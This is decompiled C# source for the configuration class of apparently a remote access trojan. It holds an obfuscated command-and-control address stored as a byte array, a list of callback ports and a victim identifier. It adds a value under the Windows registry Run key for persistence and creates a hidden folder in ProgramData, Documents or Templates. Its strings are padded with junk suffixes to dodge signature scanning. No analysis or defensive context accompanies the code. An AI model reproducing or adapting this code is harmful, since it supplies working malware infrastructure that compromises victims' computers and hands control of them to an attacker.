using System;
using System.IO;
using System.Windows.Forms;
using Microsoft.Win32;

namespace awdrgori;

internal static class awdrgoriCONF
{
	public static byte[] awdrgorivpsips = new byte[31]
	{
		49, 56, 53, 46, 49, 50, 53, 46, 50, 48,
		54, 46, 50, 51, 55, 63, 114, 111, 104, 105,
		114, 111, 122, 110, 97, 109, 97, 46, 99, 111,
		109
	};

	public static string awdrgoriappPath = "\\Lfrod\\|awdrgori".Split(new char[1] { '|' })[0];

	public static string awdrgoridefaultP = "233.125.211.121|awdrgori".Split(new char[1] { '|' })[0];

	public static string awdrgorimainApp = "awdrgori|awdrgori".Split(new char[1] { '|' })[0];

	public static int[] ports = new int[5] { 3185, 6582, 11814, 14686, 18128 };

	public static int awdrgoriport;

	public static string awdrgoripc_id = "kmhx|awdrgori".Split(new char[1] { '|' })[0];

	public static string awdrgoriremvUser = "kludmnc|awdrgori".Split(new char[1] { '|' })[0];

	public static string awdrgorifilesLogs = "ldbrd".Split(new char[1] { '|' })[0];

	public static string awdrgoriAppPath = "";

	public static string awdrgoriOsname()
	{
		try
		{
			RegistryKey registryKey = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\WindowsNT\\CurrentVersion!awdrgori".Split(new char[1] { '!' })[0]);
			if (registryKey != null)
			{
				string text = registryKey.GetValue("ProductName!awdrgori".Split(new char[1] { '!' })[0])!.ToString()!.Trim();
				if (text != null)
				{
					return text;
				}
			}
			OperatingSystem oSVersion = Environment.OSVersion;
			return oSVersion.Version.Major + ">" + oSVersion.Version.Minor;
		}
		catch
		{
			return "6>1!awdrgori".Split(new char[1] { '!' })[0];
		}
	}

	public static void awdrgoriset_run(string app, string path)
	{
		try
		{
			string name = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run|awdrgori".Split(new char[1] { '|' })[0];
			RegistryKey registryKey = Registry.CurrentUser.OpenSubKey(name, writable: true);
			string text = awdrgoripc_id;
			object value = registryKey.GetValue(text + app);
			if (value == null)
			{
				registryKey.SetValue(text + app, path);
			}
			else if (value.ToString() != path)
			{
				registryKey.SetValue(text + app, path);
			}
		}
		catch
		{
		}
	}

	public static string awdrgoriget_mpath()
	{
		if (awdrgoriAppPath != "")
		{
			return awdrgoriAppPath;
		}
		awdrgoriAppPath = Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData) + awdrgoriappPath;
		try
		{
			if (!Directory.Exists(awdrgoriAppPath))
			{
				Directory.CreateDirectory(awdrgoriAppPath);
			}
			if (Directory.Exists(awdrgoriAppPath))
			{
				return awdrgoriAppPath;
			}
		}
		catch
		{
		}
		awdrgoriAppPath = Environment.GetFolderPath(Environment.SpecialFolder.Personal) + awdrgoriappPath;
		try
		{
			if (!Directory.Exists(awdrgoriAppPath))
			{
				Directory.CreateDirectory(awdrgoriAppPath);
			}
			if (!Directory.Exists(awdrgoriAppPath))
			{
				return awdrgoriAppPath;
			}
		}
		catch
		{
		}
		awdrgoriAppPath = Environment.GetFolderPath(Environment.SpecialFolder.Templates) + awdrgoriappPath;
		try
		{
			if (!Directory.Exists(awdrgoriAppPath))
			{
				Directory.CreateDirectory(awdrgoriAppPath);
			}
			if (!Directory.Exists(awdrgoriAppPath))
			{
				return awdrgoriAppPath;
			}
		}
		catch
		{
		}
		awdrgoriAppPath = Application.get_ExecutablePath();
		return awdrgoriAppPath;
	}
}
